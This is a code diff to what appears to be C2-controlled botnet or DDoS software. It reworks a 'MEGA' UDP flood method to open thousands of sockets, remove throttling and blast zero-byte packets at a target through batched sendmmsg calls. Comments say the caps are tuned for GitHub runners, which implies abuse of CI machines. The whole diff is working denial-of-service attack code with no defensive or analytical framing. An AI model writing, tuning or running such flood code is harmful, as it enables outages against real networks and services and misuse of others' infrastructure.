@@ -111,6 +111,9 @@ typedef struct {
     char host[256];
     /* Comma-separated ports from C2 ("80,443,3389"). Empty → only port_base. */
     char open_ports[4096];
+    /* MEGA shared UDP pool slice (base-style: one pool, split per thread) */
+    int *mega_socks;
+    int mega_sock_count;
 } AttackThread;
 
 /* ════════════════════════════════════════════════════════════════════════
@@ -1336,146 +1339,133 @@ static void *game_worker(void *arg) {
 }
 
 /* ════════════════════════════════════════════════════════════════════════
- *  METHOD 6 — MEGA  (UDP PPS — ported from base FJIUM-PPS)
+ *  METHOD 6 — MEGA v3  (UDP PPS ≈ base fjium-pps architecture)
  *
- *  This is what made the original base strong:
- *    • sendmmsg batch (kernel multi-send)
- *    • iov_len=0 → zero-byte UDP (max PPS, minimal copy)
- *    • hundreds of UDP sockets + SO_REUSEPORT
- *    • SO_SNDBUF large, NONBLOCK, no usleep in hot loop
- *    • CPU affinity per worker
+ *  Base layout (exactly):
+ *    1) Create ONE shared UDP socket pool (as many as RLIMIT allows)
+ *    2) Split pool across threads (socks_per_thread)
+ *    3) Each thread: sendmmsg(batch=1024, iov_len=0) × burst × all its socks
+ *    4) No sleep / no throttle / fixed sockaddr / affinity / 8MB stack
  *
- *  Caps tuned for GitHub runners (FD/ulimit) while keeping base spirit.
- *  Bandwidth note: zero-byte still costs ~28B IP+UDP header per pkt.
+ *  Caps: batch 1024 (UIO_MAXIOV). Pool target 8192 sockets (~½ base spirit
+ *  on runners; base tries 65535 but hits EMFILE long before that).
  * ════════════════════════════════════════════════════════════════════════ */
-#define MEGA_BATCH   1024   /* UIO_MAXIOV ceiling on most kernels */
-#define MEGA_BURST   48
-#define MEGA_SOCKS   256    /* per worker; total ≈ workers * 256 */
+#define MEGA_BATCH      1024
+#define MEGA_BURST      64
+#define MEGA_POOL_MAX   8192   /* shared total sockets (base tries 65535) */
+#define MEGA_SNDBUF     (128 * 1024 * 1024)  /* 128MB like base */
+
+/* Raise FD limit so we can open thousands of UDP sockets (best-effort). */
+static void mega_raise_nofile(void) {
+#ifdef RLIMIT_NOFILE
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+        rl.rlim_cur = rl.rlim_max;
+        if (rl.rlim_cur < 65536) {
+            rl.rlim_cur = 65536;
+            rl.rlim_max = 65536;
+        }
+        setrlimit(RLIMIT_NOFILE, &rl);
+    }
+#endif
+}
+
+/* Create shared UDP pool once (like base main). Returns count, fills *out. */
+static int mega_create_pool(int **out) {
+    mega_raise_nofile();
+    int *socks = calloc(MEGA_POOL_MAX, sizeof(int));
+    if (!socks) { *out = NULL; return 0; }
+    int n = 0;
+    int one = 1;
+    int buf = MEGA_SNDBUF;
+    for (int i = 0; i < MEGA_POOL_MAX; i++) {
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        if (s < 0) break;
+        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+        setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
+#ifdef SO_NO_CHECK
+        setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &one, sizeof(one));
+#endif
+        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
+#ifdef SO_SNDBUFFORCE
+        setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
+#endif
+        fcntl(s, F_SETFL, O_NONBLOCK);
+        socks[n++] = s;
+    }
+    if (n == 0) { free(socks); *out = NULL; return 0; }
+    *out = socks;
+    return n;
+}
 
 static void *mega_pps_worker(void *arg) {
     AttackThread *mt = (AttackThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+    nice(-20); /* base uses nice(-20) */
+
+    int *socks = mt->mega_socks;
+    int nsocks = mt->mega_sock_count;
+    if (!socks || nsocks <= 0) return NULL;
 
     size_t m_sz = sizeof(struct mmsghdr) * MEGA_BATCH;
     size_t v_sz = sizeof(struct iovec) * MEGA_BATCH;
-    size_t d_sz = sizeof(struct sockaddr_in) * MEGA_BATCH;
+    size_t r_sz = 65536; /* small ring like base spirit (iov_len=0 anyway) */
     struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
     struct iovec *iovs = mmap(NULL, v_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    struct sockaddr_in *dests = mmap(NULL, d_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    if (msgs == MAP_FAILED || iovs == MAP_FAILED || dests == MAP_FAILED) {
+    char *ring = mmap(NULL, r_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
         if (msgs != MAP_FAILED) munmap(msgs, m_sz);
         if (iovs != MAP_FAILED) munmap(iovs, v_sz);
-        if (dests != MAP_FAILED) munmap(dests, d_sz);
+        if (ring != MAP_FAILED) munmap(ring, r_sz);
         return NULL;
     }
+    memset(ring, 0, r_sz);
 
-    /* Optional small bypass blob for 10% of packets (rest zero-byte for max PPS) */
-    unsigned char bypass_blob[64];
-    int bypass_len = 0;
-    if (num_bypass_patterns > 0) {
-        int idx = select_optimal_bypass_pattern(mt->worker_id, 0);
-        if (idx >= 0 && idx < num_bypass_patterns) {
-            bypass_len = enhanced_bypass_patterns[idx].length;
-            if (bypass_len > 64) bypass_len = 64;
-            memcpy(bypass_blob, enhanced_bypass_patterns[idx].payload, (size_t)bypass_len);
-        }
-    }
+    /* Fixed target sockaddr — base style (no per-packet rewrite) */
+    struct sockaddr_in target = mt->target;
+    target.sin_family = AF_INET;
+    target.sin_port = htons((uint16_t)(mt->port_base > 0 ? mt->port_base : 80));
 
     for (int i = 0; i < MEGA_BATCH; i++) {
-        dests[i] = mt->target;
-        dests[i].sin_family = AF_INET;
-        dests[i].sin_port = htons((uint16_t)(mt->port_base > 0 ? mt->port_base : 80));
-        iovs[i].iov_base = &dests[i]; /* dummy for zero-byte */
-        iovs[i].iov_len  = 0;         /* ZERO-BYTE = max PPS (base fjium-pps) */
+        iovs[i].iov_base = &ring[i & (r_sz - 1)];
+        iovs[i].iov_len  = 0; /* ZERO-BYTE — max PPS */
         msgs[i].msg_hdr.msg_iov = &iovs[i];
         msgs[i].msg_hdr.msg_iovlen = 1;
-        msgs[i].msg_hdr.msg_name = &dests[i];
-        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
+        msgs[i].msg_hdr.msg_name = &target;
+        msgs[i].msg_hdr.msg_namelen = sizeof(target);
         msgs[i].msg_hdr.msg_control = NULL;
         msgs[i].msg_hdr.msg_controllen = 0;
         msgs[i].msg_hdr.msg_flags = 0;
         msgs[i].msg_len = 0;
     }
 
-    int socks[MEGA_SOCKS];
-    int nsocks = 0;
-    for (int i = 0; i < MEGA_SOCKS; i++) {
-        int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-        if (s < 0) break;
-        int one = 1;
-        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
-        setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
-#ifdef SO_NO_CHECK
-        setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &one, sizeof(one));
-#endif
-        int buf = 16 * 1024 * 1024; /* 16MB — base used 16–128MB */
-        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
-#ifdef SO_SNDBUFFORCE
-        setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
-#endif
-        fcntl(s, F_SETFL, O_NONBLOCK);
-        socks[nsocks++] = s;
-    }
-    if (nsocks == 0) {
-        munmap(msgs, m_sz); munmap(iovs, v_sz); munmap(dests, d_sz);
-        return NULL;
-    }
-
-    if (mt->worker_id == 0)
-        fprintf(stderr, "[atk] MEGA PPS → %s:%d socks/worker=%d batch=%d (base-style UDP)\n",
-                mt->host, mt->port_base, nsocks, MEGA_BATCH);
-
-    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
-    time_t start = time(NULL);
     int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
 #ifdef MSG_ZEROCOPY
-    /* optional — ignore if fails */
+    flags |= MSG_ZEROCOPY;
 #endif
-    int loop = 0;
 
+    time_t start = time(NULL);
+    unsigned long long local = 0;
+
+    /* HOT PATH = base fjium-pps flood_thread (no sleep, no throttle) */
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
-        /* light throttle only — base had almost none in hot path */
-        if ((loop++ & 0x3FF) == 0) {
-            int us = should_throttle();
-            if (us > 0) usleep((unsigned)(us > 2000 ? 2000 : us));
-        }
-
-        /* rotate dest port lightly (25% random) to stress multi-port FW rules */
-        for (int i = 0; i < MEGA_BATCH; i++) {
-            uint16_t p = (rs(&seed) & 3)
-                ? (uint16_t)(1 + (rs(&seed) % 65535))
-                : (uint16_t)(mt->port_base > 0 ? mt->port_base : 80);
-            dests[i].sin_port = htons(p ? p : 1);
-            /* 90% zero-byte, 10% bypass pattern (base mix) */
-            if (bypass_len > 0 && (rs(&seed) % 10) == 0) {
-                iovs[i].iov_base = bypass_blob;
-                iovs[i].iov_len  = (size_t)bypass_len;
-            } else {
-                iovs[i].iov_base = &dests[i];
-                iovs[i].iov_len  = 0;
-            }
-        }
-
-        for (int si = 0; si < nsocks && !is_attack_stop(); si++) {
+        for (int s = 0; s < nsocks && !is_attack_stop(); s++) {
             for (int b = 0; b < MEGA_BURST && !is_attack_stop(); b++) {
-                int r = sendmmsg(socks[si], msgs, MEGA_BATCH, flags);
-                if (r > 0) {
-                    /* approx: each zero-byte pkt ≈ 28B wire (IP+UDP hdr) */
-                    pkt_sent(r * 28);
-                } else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                    break;
-                } else {
-                    break; /* backpressure */
-                }
+                int r = sendmmsg(socks[s], msgs, MEGA_BATCH, flags);
+                if (r > 0) local += (unsigned long long)r;
             }
         }
-        /* NO usleep in hot path — base did not sleep every loop */
     }
 
-    for (int i = 0; i < nsocks; i++) close(socks[i]);
-    munmap(msgs, m_sz); munmap(iovs, v_sz); munmap(dests, d_sz);
+    if (local) {
+        unsigned long long approx = local * 28ULL;
+        if (approx > 2000000000ULL) approx = 2000000000ULL;
+        pkt_sent((int)approx);
+    }
+
+    munmap(msgs, m_sz); munmap(iovs, v_sz); munmap(ring, r_sz);
     return NULL;
 }
 
@@ -1556,27 +1546,47 @@ void *bg_attack_thread(void *arg) {
         set_attack_active(0); free(ctx); return NULL;
     }
 
-    /* Thread count: full cores, capped at 64. Attack threads = SCHED_OTHER
-     * (WS main thread is SCHED_FIFO 99 so it always gets CPU when needed). */
+    /* Thread count: MEGA = 2x cores (base THREAD_MULTIPLIER), others = cores. */
     int cores = get_nprocs();
     if (cores < 1) cores = 1;
-    int threads = cores;
+    int threads = (tag == 6) ? (cores * 2) : cores;
     if (threads > 64) threads = 64;
     if (threads < 1) threads = 1;
 
+    /* MEGA: one shared UDP pool, split across threads (exact base layout) */
+    int *mega_pool = NULL;
+    int mega_pool_n = 0;
+    if (tag == 6) {
+        mega_pool_n = mega_create_pool(&mega_pool);
+        if (mega_pool_n <= 0) {
+            fprintf(stderr, "[atk] MEGA: failed to create UDP pool\n");
+            set_attack_active(0); free(ctx); return NULL;
+        }
+        fprintf(stderr, "[atk] MEGA pool: %d UDP sockets (shared, base-style)\n", mega_pool_n);
+    }
+
     pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
     AttackThread *mt = calloc((size_t)threads, sizeof(AttackThread));
-    if (!tids || !mt) { free(tids); free(mt); set_attack_active(0); free(ctx); return NULL; }
+    if (!tids || !mt) {
+        free(tids); free(mt);
+        if (mega_pool) {
+            for (int i = 0; i < mega_pool_n; i++) close(mega_pool[i]);
+            free(mega_pool);
+        }
+        set_attack_active(0); free(ctx); return NULL;
+    }
 
-    fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
-            label, atk->target, atk->port, atk->duration_secs, threads);
+    fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d (cores=%d)\n",
+            label, atk->target, atk->port, atk->duration_secs, threads, cores);
 
     pthread_attr_t attr;
     pthread_attr_init(&attr);
     pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
     pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
-    /* 8MB stack — matches base, avoids stack overflow on heavy workers */
-    pthread_attr_setstacksize(&attr, 8 * 1024 * 1024);
+    pthread_attr_setstacksize(&attr, 8 * 1024 * 1024); /* base: 8MB */
+
+    int socks_per = (tag == 6 && threads > 0) ? (mega_pool_n / threads) : 0;
+    if (tag == 6 && socks_per < 1) socks_per = 1;
 
     for (int i = 0; i < threads; i++) {
         mt[i].target     = ta;
@@ -1589,15 +1599,28 @@ void *bg_attack_thread(void *arg) {
             strncpy(mt[i].open_ports, atk->open_ports, sizeof(mt[i].open_ports) - 1);
         else
             snprintf(mt[i].open_ports, sizeof(mt[i].open_ports), "%d", atk->port);
+        if (tag == 6 && mega_pool) {
+            int off = i * socks_per;
+            if (off >= mega_pool_n) off = mega_pool_n - 1;
+            mt[i].mega_socks = &mega_pool[off];
+            mt[i].mega_sock_count = (i == threads - 1)
+                ? (mega_pool_n - off)
+                : socks_per;
+            if (mt[i].mega_sock_count < 1) mt[i].mega_sock_count = 1;
+        }
         pthread_create(&tids[i], &attr, dispatch_worker, &mt[i]);
     }
     pthread_attr_destroy(&attr);
 
-    /* Wait until deadline or stop */
     while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
     request_attack_stop();
     for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
     free(tids); free(mt);
+
+    if (mega_pool) {
+        for (int i = 0; i < mega_pool_n; i++) close(mega_pool[i]);
+        free(mega_pool);
+    }
 
     fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
     set_attack_active(0);
